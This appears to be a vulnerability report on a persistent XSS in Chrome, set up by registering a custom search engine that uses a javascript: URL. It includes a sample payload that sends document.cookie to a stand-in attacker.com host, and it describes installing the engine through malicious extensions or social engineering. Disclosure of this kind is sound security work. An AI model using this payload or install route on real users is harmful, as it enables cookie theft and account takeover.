<h3>The problem</h3>
<h4>Please describe the technical details of the vulnerability</h4>
<p>A persistent client-side XSS vulnerability exists in Google Chrome via the Custom Search Engine configuration. By registering a search engine using a javascript: URL as a search template, an attacker can trigger JavaScript execution within the browser context when the user:</p>
<p>Uses the default search engine,</p>
<p>Navigates to any page with an input box (e.g., <a href="http://www.google.com" data-b-widget="url" data-b-original-href="http://www.google.com" data-b-redirected-href="https://www.google.com/url?q=http://www.google.com&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw0x0NQRpl8cQqw-KhvGZyM_">www.google.com</a>, <a href="http://www.bing.com" data-b-widget="url" data-b-original-href="http://www.bing.com" data-b-redirected-href="https://www.google.com/url?q=http://www.bing.com&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw16-CZCZsHXQqyUw7AWEBcr">www.bing.com</a>, or any other domain),</p>
<p>Or interacts with address bar search functionality.</p>
<p>This XSS is persistent because it is saved within chrome://settings/searchEngines, and will trigger even after browser restarts, without requiring any user interaction beyond normal navigation.</p>

<h4>Impact analysis – Please briefly explain who can exploit the vulnerability, and what they gain when doing so</h4>
<p>An attacker can exploit this issue to establish a persistent XSS in the victim&#39;s browser by tricking them into installing a custom search engine via:</p>
<p>A malicious extension that automatically adds the custom search engine.</p>
<p>A social engineering page that instructs the user to manually add the search engine (looks harmless).</p>
<p>A pre-installed configuration in compromised environments (schools, companies, cybercafes, malware).</p>
<p>Once the attacker sets up the custom search engine with:
javascript:fetch(&#39;<a href="javascript:void(0);" data-b-widget="url" data-b-original-href="https://attacker.com/log?cookie=&#39;+document.cookie)//%s" data-b-redirected-href="https://www.google.com/url?q=https://attacker.com/log?cookie%3D&#39;%2Bdocument.cookie)//%25s&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw0ea-kakm9DpGYJC7pvH9T0">https://attacker.com/log?cookie=&#39;+document.cookie)//%s</a></p>
<p>And makes it the default, the XSS will:</p>
<p>persist even after browser restarts.</p>
<p>trigger automatically when the user navigates to search-related or address bar related domains like:</p>
<p>bing.com</p>
<p>google.com</p>
<p>yahoo.com</p>
<p>or any other site where Chrome suggests the default search engine.</p>
<p>Every time the victim:</p>
<p>Uses the omnibox,</p>
<p>Visits legitimate search engines,</p>
<p>Or types anything without even searching,</p>
<p>the JavaScript payload will execute persistently, allowing:</p>
<p>Cookie theft</p>
<p>Session hijacking</p>
<p>Account takeover</p>
<p>Forced redirects</p>
<p>Further exploitation</p>
